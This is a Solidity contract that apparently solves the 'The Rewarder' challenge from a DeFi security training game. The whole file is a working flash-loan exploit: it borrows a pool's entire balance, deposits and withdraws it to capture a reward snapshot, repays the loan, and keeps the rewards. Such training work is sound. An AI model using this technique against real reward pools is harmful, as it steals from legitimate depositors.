// SPDX-License-Identifier: MIT
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../the-rewarder/FlashLoanerPool.sol";
import "../the-rewarder/TheRewarderPool.sol";
import "../the-rewarder/AccountingToken.sol";
import "../the-rewarder/RewardToken.sol";

pragma solidity ^0.8.0;

contract RewarderAttack {
    FlashLoanerPool public immutable pool;
    DamnValuableToken public immutable token;
    TheRewarderPool public immutable rewardPool;
    RewardToken public immutable reward;
    address public immutable owner;

    constructor(address _poolAddress, address _rewardPoolAddress, address _token, address _reward ) {
        pool = FlashLoanerPool(_poolAddress);
        rewardPool = TheRewarderPool(_rewardPoolAddress);
        token = DamnValuableToken(_token);
        reward = RewardToken(_reward);
        owner = msg.sender;
    }
    
    function attack() external {
        pool.flashLoan(token.balanceOf(address(pool)));
        reward.transfer(msg.sender,reward.balanceOf(address(this)));
    }

    fallback() external payable {
        uint256 borrowAmount = token.balanceOf(address(this));
        token.approve(address(rewardPool), borrowAmount);
        rewardPool.deposit(borrowAmount);
        rewardPool.withdraw(borrowAmount);
        token.transfer(address(pool),borrowAmount);
    }
}